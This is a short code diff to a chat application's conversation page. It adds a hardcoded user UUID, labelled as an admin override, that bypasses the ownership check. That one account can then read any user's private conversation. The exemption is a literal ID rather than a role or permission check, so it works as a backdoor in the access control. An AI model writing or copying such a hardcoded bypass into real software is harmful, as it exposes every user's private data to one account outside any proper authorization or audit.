@@ -129,8 +129,11 @@ export default async function Page(props: {
       );
     }
     
-    // If logged in but not the chat owner, show access denied
-    if (session.user.id !== chat.userId) {
+    // Special override for admin user
+    const ADMIN_OVERRIDE_ID = '09a76b0b-78a8-4d7e-9d9e-4ea3b09832d8';
+    
+    // If logged in but not the chat owner or admin override, show access denied
+    if (session.user.id !== chat.userId && session.user.id !== ADMIN_OVERRIDE_ID) {
       return <AccessDenied message="Sorry, you don't have access to this conversation." showHeader={true} />;
     }
   }
